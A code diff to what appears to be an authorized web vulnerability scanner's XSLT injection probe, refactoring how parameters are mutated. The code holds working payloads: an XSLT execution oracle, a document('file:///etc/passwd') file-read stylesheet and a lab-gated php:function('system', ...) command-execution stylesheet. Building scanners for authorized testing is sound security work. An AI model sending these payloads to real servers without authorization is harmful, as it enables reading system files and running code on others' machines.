@@ -13,6 +13,7 @@
 //
 // Proof: unique markers only. One finding per sink at highest severity
 // (no triple counting). $0, no new deps.
+import { mutateUrl, probePointName, probePointParameter } from '../probePoints.js';
 
 const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
 
@@ -70,7 +71,7 @@ async function d1Surfaces(url, params, opts) {
   const surfaces = [];
   const u = new URL(url);
   for (const p of params || []) {
-    if (/^(xsl|xslt|stylesheet|transform|template)$/i.test(p)) {
+    if (/^(xsl|xslt|stylesheet|transform|template)$/i.test(probePointName(p))) {
       surfaces.push({ kind: 'param', param: p });
     }
   }
@@ -96,12 +97,8 @@ async function d1Surfaces(url, params, opts) {
 // ---- D2: execution oracle ----------------------------------------------------------------------
 async function d2Exec(url, surface, opts, rid) {
   if (surface.kind === 'param') {
-    const u = new URL(url);
-    u.searchParams.set(surface.param, arithSheet());
-    const rPay = await fetchFull(u.toString(), opts);
-    const u2 = new URL(url);
-    u2.searchParams.set(surface.param, baselineSheet(rid));
-    const rBase = await fetchFull(u2.toString(), opts);
+    const rPay = await fetchFull(mutateUrl(url, surface.param, arithSheet()), opts);
+    const rBase = await fetchFull(mutateUrl(url, surface.param, baselineSheet(rid)), opts);
     if (!rPay || !rBase) return null;
     const execProof = rPay.text.includes('9352') && !rBase.text.includes('9352');
     if (execProof) return { surface, rPay };
@@ -157,9 +154,9 @@ export async function probeXslt(url, params, opts = {}) {
       title: 'XSLT injection — stylesheet executed server-side (HIGH)',
       severity: 'high',
       url,
-      parameter: s.param || s.kind,
+      parameter: s.param ? probePointParameter(s.param) : s.kind,
       evidence: ev(
-        `Stylesheet <xsl:value-of select="1336*7"/> via ${s.kind}${s.param ? ` param ${s.param}` : ''}`,
+        `Stylesheet <xsl:value-of select="1336*7"/> via ${s.kind}${s.param ? ` param ${probePointParameter(s.param)}` : ''}`,
         `Response contains literal 9352 in transformed output; inert baseline did not — "...${execWindow}..."`,
         'XSLT execution primitive: file-read / code-exec chains available.'
       ),
@@ -167,9 +164,7 @@ export async function probeXslt(url, params, opts = {}) {
     // D3: document() file-read (only when D2 confirmed).
     if (s.kind === 'param') {
       const docSheet = `${XSL_OPEN}<xsl:value-of select="document('file:///etc/passwd')"/>${XSL_CLOSE}`;
-      const u = new URL(url);
-      u.searchParams.set(s.param, docSheet);
-      const r3 = await fetchFull(u.toString(), opts);
+      const r3 = await fetchFull(mutateUrl(url, s.param, docSheet), opts);
       if (r3 && r3.text.includes('root:x:0:0')) {
         const idx3 = r3.text.indexOf('root:x:0:0');
         const window3 = r3.text.slice(Math.max(0, idx3 - 60), idx3 + 120);
@@ -179,9 +174,9 @@ export async function probeXslt(url, params, opts = {}) {
           title: 'XSLT injection — document() file read (CRITICAL)',
           severity: 'critical',
           url,
-          parameter: s.param,
+          parameter: probePointParameter(s.param),
           evidence: ev(
-            `Stylesheet document('file:///etc/passwd') via param ${s.param}`,
+            `Stylesheet document('file:///etc/passwd') via param ${probePointParameter(s.param)}`,
             `Verbatim root:x:0:0 in transformed output — "...${window3}..."`,
             'Arbitrary file read via XSLT document().'
           ),
@@ -190,9 +185,7 @@ export async function probeXslt(url, params, opts = {}) {
       // D5: PHP code-exec (LAB-ONLY).
       if (lab && !best.title.includes('CRITICAL')) {
         const phpSheet = `${XSL_OPEN}<xsl:value-of select="php:function('system','echo DM_XSLTEXEC_${rid}')"/>${XSL_CLOSE}`;
-        const u5 = new URL(url);
-        u5.searchParams.set(s.param, phpSheet);
-        const r5 = await fetchFull(u5.toString(), opts);
+        const r5 = await fetchFull(mutateUrl(url, s.param, phpSheet), opts);
         if (r5 && r5.text.includes(`DM_XSLTEXEC_${rid}`) && !r5.text.includes('php:function')) {
           const idx5 = r5.text.indexOf(`DM_XSLTEXEC_${rid}`);
           const window5 = r5.text.slice(Math.max(0, idx5 - 60), idx5 + 60);
@@ -202,9 +195,9 @@ export async function probeXslt(url, params, opts = {}) {
             title: 'XSLT injection — PHP function execution (CRITICAL)',
             severity: 'critical',
             url,
-            parameter: s.param,
+            parameter: probePointParameter(s.param),
             evidence: ev(
-              `Stylesheet php:function('system',...) via param ${s.param} (lab-only)`,
+              `Stylesheet php:function('system',...) via param ${probePointParameter(s.param)} (lab-only)`,
               `Marker DM_XSLTEXEC_${rid} executed server-side (php:function source absent) — "...${window5}..."`,
               'Remote code execution via XSLT PHP functions.'
             ),
